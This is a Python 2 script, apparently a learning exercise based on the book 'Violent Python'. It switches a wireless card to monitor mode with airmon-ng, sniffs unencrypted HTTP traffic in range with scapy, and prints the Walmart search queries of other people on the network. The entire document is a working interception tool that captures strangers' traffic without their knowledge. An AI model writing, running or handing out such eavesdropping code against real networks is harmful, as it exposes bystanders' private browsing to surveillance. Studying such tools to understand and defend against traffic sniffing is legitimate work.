#!/usr/bin/env python2
# written by Moses Arocha
# Written with the help of TJ O'Connor in his book "Violent Python"
# This code analyzes the wireless traffic for any search requests on Wal-Mart's website

import optparse
from scapy.all import *

# The AnalyzeTraffic function will analyze all network traffic that is within range, and will grab any packets that have walmart within them
# After that it will search through the packet and grab the URL and from the URL will grab the portion of text after "query=" 
def AnalyzeTraffic(packets):
	if packets.haslayer(Raw):	
		payload = packets.getlayer(Raw).load					# Will grab the raw, unecrypted WIFI packets
		if 'GET' in payload:							
			print "\n\t Scanning For Wal-Mart Traffic" 
			if 'walmart' in payload:					# If Walmart is within the packet or payload
				r = re.findall(r'(?i)\&q=(.*?)\&', payload)		# It will Fumble through the code, reading it
				if r:
					search = r[0].split('&')[0]			# And break it up into sections	
					search = search.replace('query=', '').replace('+', ' ').replace('%20', ' ')	# It will search for a section with the 'query portion, and display that search result
					print '\t[Success] Searched For: ' + search	# If successful, will printout this to the user

#The code first grabs the users information, defaulting to mon0 interface then will send the information to the AnalyzeTraffic function
def main():
	parser = optparse.OptionParser("Usages For Program: -I <Interface>")
	parser.add_option('-I', dest='interface', type='string', help='Specify Interface To Listen On', default='mon0')
	(options, args) = parser.parse_args()
	if options.interface == None:
		print parser.usage
		exit(0)
	else:
		conf.iface = options.interface
	try:
		if not os.geteuid() == 0:
		    	sys.exit('\t Please Run As Root!!')		# Checks to see if the user is root, this code can only be run in root
		os.system('sudo airmon-ng start wlan0')		# Interacts with terminal to put the wireless NIC in monitor mode
		print " \t The Sniffing Has Begun... Please Wait... \n\n"
		sniff(filter='tcp port 80', prn=AnalyzeTraffic)

	except KeyboardInterrupt:
		exit(0)

if __name__ == '__main__':
	main()
